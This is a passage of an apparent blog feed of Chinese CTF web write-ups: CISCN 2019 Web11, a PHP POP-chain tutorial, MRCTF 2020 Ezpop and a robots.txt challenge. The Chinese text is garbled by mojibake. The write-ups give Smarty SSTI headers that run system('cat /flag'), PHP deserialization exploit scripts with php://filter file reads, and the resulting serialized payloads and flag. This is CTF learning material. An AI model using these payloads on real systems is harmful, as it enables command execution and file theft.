src="/2021/07/18/gyctf-2020-flaskapp/image-20210719020512644.png" alt="5"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN:2019-Web11</title>
      <link href="2021/07/17/ciscn-2019-web11/"/>
      <url>2021/07/17/ciscn-2019-web11/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/07/17/ciscn-2019-web11/1.png" alt="1"></p><pre class=" language-php"><code class="language-php">X<span class="token operator">-</span>Forwarded<span class="token operator">-</span><span class="token keyword">For</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">if</span><span class="token punctuation">}</span></code></pre><pre class=" language-php"><code class="language-php">X<span class="token operator">-</span>Forwarded<span class="token operator">-</span><span class="token keyword">For</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'cat ../../../../../../../../flag'</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre class=" language-php"><code class="language-php">X<span class="token operator">-</span>Forwarded<span class="token operator">-</span><span class="token keyword">For</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">if</span><span class="token punctuation">}</span></code></pre><p><img src="/2021/07/17/ciscn-2019-web11/2.png" alt="2"></p><p><img src="/2021/07/17/ciscn-2019-web11/3.png" alt="3"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>popé“¾</title>
      <link href="2021/07/16/pop-lian/"/>
      <url>2021/07/16/pop-lian/</url>
      
        <content type="html"><![CDATA[<p>å‚è€ƒï¼š<a href="https://blog.csdn.net/weixin_45645113/article/details/105309695">https://blog.csdn.net/weixin_45645113/article/details/105309695</a></p><h3 id="PHPé­”æœ¯æ–¹æ³•ï¼š"><a href="#PHPé­”æœ¯æ–¹æ³•ï¼š" class="headerlink" title="PHPé­”æœ¯æ–¹æ³•ï¼š"></a>PHPé­”æœ¯æ–¹æ³•ï¼š</h3><ul><li><strong>__sleep() //ä½¿ç”¨serializeæ—¶è§¦å‘</strong></li><li><strong>__destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</strong></li><li>__<strong>call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</strong></li><li><strong>__callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</strong></li><li><strong>__get() //ç”¨äºŽä»Žä¸å¯è®¿é—®çš„å±žæ€§è¯»å–æ•°æ®</strong></li><li>__<strong>set() //ç”¨äºŽå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±žæ€§</strong></li><li><strong>__isset() //åœ¨ä¸å¯è®¿é—®çš„å±žæ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</strong></li><li><strong>__unset() //åœ¨ä¸å¯è®¿é—®çš„å±žæ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</strong></li><li><strong>__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</strong></li><li>__<strong>invoke() //å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</strong></li></ul><h3 id="ä¾‹å­ï¼š"><a href="#ä¾‹å­ï¼š" class="headerlink" title="ä¾‹å­ï¼š"></a>ä¾‹å­ï¼š</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//flag is in flag.php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Read</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string">'index.php'</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">.</span><span class="token string">'Welcome'</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/gopher|http|ftp|https|dict|\.\.|flag|file/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token string">'pop3.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$show</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><ol><li>é¦–å…ˆçœ‹åˆ°unserialize($_GET[â€˜helloâ€™]) å°†getä¼ å‚çš„helloè¿›è¡Œäº†ååºåˆ—åŒ–æ“ä½œã€‚é‚£ä¹ˆå°†ä¼šè°ƒç”¨åˆ°Showç±»ä¸­</li><li>__weakupæ–¹æ³•ã€‚<br>å› ä¸º this-&gt;source = â€œindex.phpâ€ sourceè¢«å½“åšå­—ç¬¦ä¸²æ‰€ä»¥è°ƒç”¨Showç±»ä¸­çš„__to string.</li><li><strong>return $this-&gt;str[â€˜strâ€™]-&gt;source</strong> sourceå±žæ€§ä¸å­˜åœ¨æ‰€ä»¥è°ƒç”¨Testç±»ä¸­çš„ getæ–¹æ³•ã€‚</li><li><strong>$function = $this-&gt;p;return $function();</strong><br>æŠŠå–å‡ºæ¥çš„på½“åšè¿˜æ˜¯è°ƒç”¨å› æ­¤åˆä¼šå¼•èµ·è°ƒç”¨äº† Readç±»ä¸­çš„__invokeæ–¹æ³•ï¼Œå…¶ä¸­å°±å¯ä»¥æŠŠæ–‡ä»¶è¯»å–å‡ºæ¥äº†ã€‚</li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Read</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token string">"flag.php"</span><span class="token punctuation">}</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$t</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$t</span> <span class="token operator">-</span><span class="token operator">></span> p <span class="token operator">=</span> <span class="token variable">$r</span><span class="token punctuation">;</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string">"str"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> source <span class="token operator">=</span> <span class="token variable">$s</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF:2020-Ezpop</title>
      <link href="2021/07/16/mrctf-2020-ezpop/"/>
      <url>2021/07/16/mrctf-2020-ezpop/</url>
      
        <content type="html"><![CDATA[<pre class=" language-PHP"><code class="language-PHP"> <?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier {    protected  $var;    public function append($value){        include($value);    }    public function __invoke(){        $this->append($this->var);    }}class Show{    public $source;    public $str;    public function __construct($file='index.php'){        $this->source = $file;        echo 'Welcome to '.$this->source."<br>";    }    public function __toString(){        return $this->str->source;    }    public function __wakeup(){        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {            echo "hacker";            $this->source = "index.php";        }    }}class Test{    public $p;    public function __construct(){        $this->p = array();    }    public function __get($key){        $function = $this->p;        return $function();    }}if(isset($_GET['pop'])){    @unserialize($_GET['pop']);}else{    $a=new Show;    highlight_file(__FILE__);} </code></pre><p>é­”æœ¯æ–¹æ³•ï¼š</p><ul><li><strong>__construct   å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨ï¼Œ</strong></li><li><strong>__toString   å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¢«è°ƒç”¨ã€‚</strong></li><li><strong>__wakeup()   ä½¿ç”¨unserializeæ—¶è§¦å‘</strong></li><li>__<strong>get()    ç”¨äºŽä»Žä¸å¯è®¿é—®çš„å±žæ€§è¯»å–æ•°æ®</strong><br>**#éš¾ä»¥è®¿é—®åŒ…æ‹¬ï¼šï¼ˆ1ï¼‰ç§æœ‰å±žæ€§ï¼Œï¼ˆ2ï¼‰æ²¡æœ‰åˆå§‹åŒ–çš„å±žæ€§**</li><li><strong>__invoke()   å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</strong></li></ul><p>æ¢³ç†ä¸€ä¸‹ï¼š</p><p>getèŽ·å¾—pop</p><p>@unserialize($_GET[â€˜popâ€™]);è°ƒç”¨__wakeup()</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"hacker"</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>è°ƒç”¨äº†__tostring()</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><code>__toString()</code>å…¶ä¸­strèµ‹å€¼ä¸ºä¸€ä¸ªå®žä¾‹åŒ–çš„Testç±»ï¼Œé‚£ä¹ˆå…¶ç±»ä¸å«æœ‰sourceå±žæ€§ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨Testä¸­çš„<code>_get()</code>æ–¹æ³•ã€‚</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>Get()è°ƒç”¨åˆ°å…¶ä»–å‡½æ•°ï¼Œå°±ä¼šè°ƒç”¨åˆ°__invoke()å‡½æ•°</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token operator">=</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=flag.php";</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>è¿è¡Œç»“æžœï¼š</p><pre class=" language-php"><code class="language-php">O<span class="token operator">%</span><span class="token constant">3A4</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22Show<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A2</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A6</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22source<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3BO</span><span class="token operator">%</span><span class="token constant">3A4</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22Show<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A2</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A6</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22source<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A3</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22aaa<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A3</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22str<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3BO</span><span class="token operator">%</span><span class="token constant">3A4</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22Test<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22p<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3BO</span><span class="token operator">%</span><span class="token constant">3A8</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22Modifier<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A6</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token constant">2A</span><span class="token operator">%</span>00var<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A57</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22php<span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token constant">2F</span><span class="token operator">%</span>2Ffilter<span class="token operator">%</span>2Fread<span class="token operator">%</span>3Dconvert<span class="token punctuation">.</span>base64<span class="token operator">-</span>encode<span class="token operator">%</span>2Fresource<span class="token operator">%</span>3Dflag<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">7D</span><span class="token operator">%</span><span class="token constant">7D</span><span class="token operator">%</span>7Ds<span class="token operator">%</span><span class="token constant">3A3</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22str<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3BN</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">7D</span></code></pre><p><img src="/2021/07/16/mrctf-2020-ezpop/image-20210716223532595.png" alt="image-20210716223532595"></p><pre><code>PD9waHAKY2xhc3MgRmxhZ3sKICAgIHByaXZhdGUgJGZsYWc9ICJmbGFnezcxMWJiYjQxLWY2MGQtNGQyMi1iNDc4LTYzZmMwNDg2NDc5NX0iOwp9CmVjaG8gIkhlbHAgTWUgRmluZCBGTEFHISI7Cj8+</code></pre><p>base64è§£ç ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$flag</span><span class="token operator">=</span> <span class="token string">"flag{711bbb41-f60d-4d22-b478-63fc04864795}"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"Help Me Find FLAG!"</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> popé“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:web-training-WWW-Robots</title>
      <link href="2021/07/16/xctf-web-training-www-robots/"/>
      <url>2021/07/16/xctf-web-training-www-robots/</url>
      
        <content type="html"><![CDATA[<p>é¢˜ç›®æè¿°</p><pre><code>In this little training challenge, you are going to learn about the Robots_exclusion_standard.The robots.txt file is used by web crawlers to check if they are allowed to crawl and index your website or only parts of it.Sometimes these files reveal the directory structure instead protecting the content from being crawled.Enjoy!</code></pre><p>ç¿»è¯‘</p><pre><code>åœ¨è¿™ä¸ªå°çš„è®­ç»ƒæŒ‘æˆ˜ä¸­ï¼Œä½ å°†å­¦ä¹ æœºå™¨äººæ ‡å‡†ã€‚è¿™ä¸ªæœºå™¨äºº.txtæ–‡ä»¶è¢«ç½‘ç»œçˆ¬è™«ç”¨æ¥æ£€æŸ¥ä»–ä»¬æ˜¯å¦è¢«å…è®¸çˆ¬ç½‘å’Œç´¢å¼•ä½ çš„ç½‘ç«™æˆ–åªæ˜¯å®ƒçš„ä¸€éƒ¨åˆ†ã€‚æœ‰æ—¶ï¼Œè¿™äº›æ–‡ä»¶ä¼šæ˜¾ç¤ºç›®å½•ç»“æž„ï¼Œè€Œä¸æ˜¯ä¿æŠ¤å†…å®¹ä¸è¢«çˆ¬ç½‘ã€‚å¥½å¥½äº«å—ï¼</code></pre><p>æœ¬é¢˜è€ƒå¯ŸçŸ¥è¯†ç‚¹robots.txtâ€“robots.txtè§£é¢˜robots.txtæ–‡ä»¶æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œä½¿ç”¨ä»»ä½•ä¸€ä¸ªå¸¸è§çš„æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œæ¯”å¦‚Windowsç³»ç»Ÿè‡ªå¸¦çš„Notepadï¼Œå°±å¯ä»¥åˆ›å»ºå’Œç¼–è¾‘å®ƒ[1]ã€‚robots.txtæ˜¯ä¸€ä¸ªåè®®ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå‘½ä»¤ã€‚robots.txtæ˜¯æœç´¢å¼•æ“Žä¸­è®¿é—®ç½‘ç«™çš„æ—¶å€™è¦æŸ¥çœ‹çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ã€‚robots.txtæ–‡ä»¶å‘Šè¯‰èœ˜è››ç¨‹åºåœ¨æœåŠ¡å™¨ä¸Šä»€ä¹ˆæ–‡ä»¶æ˜¯å¯ä»¥è¢«æŸ¥çœ‹çš„ã€‚å½“ä¸€ä¸ªæœç´¢èœ˜è››è®¿é—®ä¸€ä¸ªç«™ç‚¹æ—¶ï¼Œå®ƒä¼šé¦–å…ˆæ£€æŸ¥è¯¥ç«™ç‚¹æ 